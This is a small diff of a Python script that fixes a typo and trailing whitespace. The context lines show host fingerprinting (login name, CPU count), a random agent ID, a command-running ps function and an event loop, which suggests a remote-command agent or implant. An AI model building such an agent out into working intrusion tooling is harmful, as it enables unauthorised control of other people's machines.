@@ -19,7 +19,7 @@ agent_id = None
 def init_data():
     global agent_id 
     whoami =   os.getlogin()
-    # maybe we use this later! 
+    # maybe we use this later!
     cpus = os.cpu_count()
     agent_id = os.urandom(16).hex()
     return {"whoami": whoami, "agent_id": agent_id}
@@ -78,7 +78,7 @@ def ps(cmd):
             print(Exception, e, res)
             return "Sad face"
     else:
-        print("No result for some reson!", res)
+        print("No result for some reason!", res)
         return "Sad face"
 
 def main_event_loop():
